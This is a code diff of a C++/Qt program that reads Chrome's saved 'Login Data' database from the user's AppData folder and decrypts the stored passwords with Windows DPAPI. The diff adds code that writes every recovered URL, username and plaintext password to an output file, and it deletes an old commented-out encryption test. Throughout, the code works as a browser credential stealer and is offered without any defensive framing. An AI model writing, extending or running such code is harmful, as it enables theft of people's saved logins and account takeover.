@@ -5,6 +5,7 @@
 #include <QString>
 #include <QDebug>
 #include <QSqlError>
+#include <QFile>
 
 #include <windows.h>
 //#include "dpapi.h"
@@ -17,12 +18,24 @@ int main(int argc, char *argv[])
     QCoreApplication a(argc, argv);
     setlocale(LC_CTYPE, "rus");
 
+    QString fileName;
+
+    //Get command line arguments
+    fileName = "output.txt";
+    if (argc > 1) fileName = argv[1];
+
+    //Output file
+    QFile file(fileName);
+    file.open(QIODevice::WriteOnly);
+
     //Connect to DB
     QSqlDatabase db;
     db = QSqlDatabase::addDatabase("QSQLITE");
+
     //Get %appdata% folder
     QString appdata = getenv("APPDATA");
     appdata.replace("\\", "/");
+
     //Destination folder
     db.setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");
     db.open();
@@ -70,7 +83,11 @@ int main(int argc, char *argv[])
                 pass_decr.append(reinterpret_cast<char *>(DataOut.pbData));
                 pass_decr.resize(pass_size);
 
-                qDebug().noquote() << endl << url << endl << "user = " << user << "\npass =  " << pass_decr;
+                qDebug().noquote() << endl << url << endl << "user = " << user << "\npass = " << pass_decr;
+
+                //Stream for writing
+                QTextStream stream(&file);
+                stream << endl << url << "\r\nuser = " << user << "\r\npass = " << pass_decr << "\r\n\r\n";
             }
             else
             {
@@ -79,63 +96,7 @@ int main(int argc, char *argv[])
         }
     }
 
-
-
-
-/*  DEBUG
-
-    //All tables in file
-    qDebug() << db.tables() << " ";
-
-    //Simple example of encryption/decryption
-    DATA_BLOB DataIn;
-    DATA_BLOB DataOut;
-    BYTE *pbDataInput =(BYTE *)"Hello world of data protection.";
-    DWORD cbDataInput = strlen((char *)pbDataInput)+17;
-
-    DataIn.pbData = pbDataInput;
-    DataIn.cbData = cbDataInput;
-    QByteArray qba;
-    char * ch = reinterpret_cast<char *> (pbDataInput);
-    qba = ch;
-
-    qDebug() << DataIn.pbData << endl<< reinterpret_cast<char *>(DataIn.pbData) << endl << qba.data();
-
-    if(CryptProtectData(
-         &DataIn,
-         NULL, // A description string
-                                             // to be included with the
-                                             // encrypted data.
-         NULL,                               // Optional entropy not used.
-         NULL,                               // Reserved.
-         NULL,                               // Pass NULL for the
-                                             // prompt structure.
-         0,
-         &DataOut))
-    {
-         qDebug() << "The encryption phase worked.\n";
-    }
-
-    DATA_BLOB DataVerify;
-
-    if ( CryptUnprotectData(
-            &DataOut,
-            NULL,
-            NULL,                 // Optional entropy
-            NULL,                 // Reserved
-            NULL,                 // Here, the optional
-                                  // prompt structure is not
-                                  // used.
-            0,
-            &DataVerify) )
-    {
-       qDebug() << "The decrypted data is: " << reinterpret_cast<char *>(DataVerify.pbData) << endl;
-       //printf("The decrypted data is: %s\n", DataVerify.pbData);
-    }
-    else qDebug() << "Decryption error!";
-
-
-*/
+    file.close();
 
     return a.exec();
 }
